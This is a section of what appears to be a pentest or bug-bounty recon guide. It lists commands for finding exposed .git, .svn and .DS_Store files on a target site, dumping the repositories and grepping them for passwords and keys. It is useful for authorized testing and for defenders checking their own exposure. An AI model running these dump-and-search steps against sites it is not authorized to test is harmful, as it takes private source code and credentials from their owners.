#### 2.2.5 Source Code/VCS Exposure Discovery
    # 1. GIT REPOSITORY DISCOVERY & DUMPING
    # Check for exposed git
    ffuf -w /usr/share/seclists/Discovery/Web-Content/git.txt \
    -u https://target.com/FUZZ \
    -t 100 \
    -mc 200,403 \
    -o git_scan.json

    # Dump found repositories
    git-dumper https://target.com/.git/ git_dump --threads 10

    # 2. SVN REPOSITORY DISCOVERY
    # Check for exposed svn
    ffuf -w /usr/share/seclists/Discovery/Web-Content/svn.txt \
    -u https://target.com/FUZZ \
    -t 100 \
    -mc 200,403 \
    -o svn_scan.json

    # Extract SVN info (alternative)
    svn export http://target.com/.svn/ svn_dump --force

    # 3. DS_STORE FILES
    # Find exposed DS_Store
    ffuf -w /usr/share/seclists/Discovery/Web-Content/dsstore.txt \
    -u https://target.com/FUZZ \
    -t 100 \
    -mc 200,403 \
    -o ds_store_scan.json

    # Parse found DS_Store
    ds_store_parser http://target.com/.DS_Store -o parsed_ds_store.txt

    # 4. COMPREHENSIVE VCS SCAN
    nuclei -u https://target.com \
    -t exposures/version-control/ \
    -severity medium,high,critical \
    -o nuclei_vcs_scan.txt

    # 5. AUTOMATED TOOLS
    # GitHound (for GitHub-related leaks)
    python3 gitHound.py -k keywords.txt -t target.com -o githound_results.json

    # TruffleHog (secret scanning)
    trufflehog git --extra-checks https://target.com/.git/

    # ADVANCED TECHNIQUES

    # 1. HISTORICAL VCS FILES (Wayback)
    waybackurls target.com | grep -E '\.(git|svn|hg|DS_Store)' | sort -u

    # 2. GIT RECONSTRUCTION
    # When full dump isn't possible
    git-extractor --partial --url https://target.com/.git/ --output partial_git

    # 3. SVN ENUMERATION
    svn list http://target.com/.svn/ --depth infinity

    # 4. METADATA ANALYSIS
    # Extract interesting files from dumps
    find git_dump -type f -exec grep -l "password\|secret\|key" {} \;

    # PRO TIPS:
    # 1. Always check for:
    #  - /.git/HEAD
    #  - /.svn/entries
    #  - /.DS_Store
    #  - /CVS/Root
    #  - /.hg/store
    # 2. Look for backup files (*.git.tar.gz, *.svn.zip)
    # 3. Check developer naming patterns (git_backup, old_svn)
    # 4. Combine with other recon data
    # 5. Be ethical - don't download proprietary code without permission

    # RECOMMENDED WORDLISTS:
    # /usr/share/seclists/Discovery/Web-Content/git.txt
    # /usr/share/seclists/Discovery/Web-Content/svn.txt
    # /usr/share/seclists/Discovery/Web-Content/dsstore.txt
    # /usr/share/seclists/Discovery/Web-Content/CVS.txt

    # EXAMPLE WORKFLOW:
    # 1. Scan for VCS metadata files
    # 2. Verify findings manually
    # 3. Dump repositories if exposed
    # 4. Search for secrets in dumped files
    # 5. Check historical data (Wayback Machine)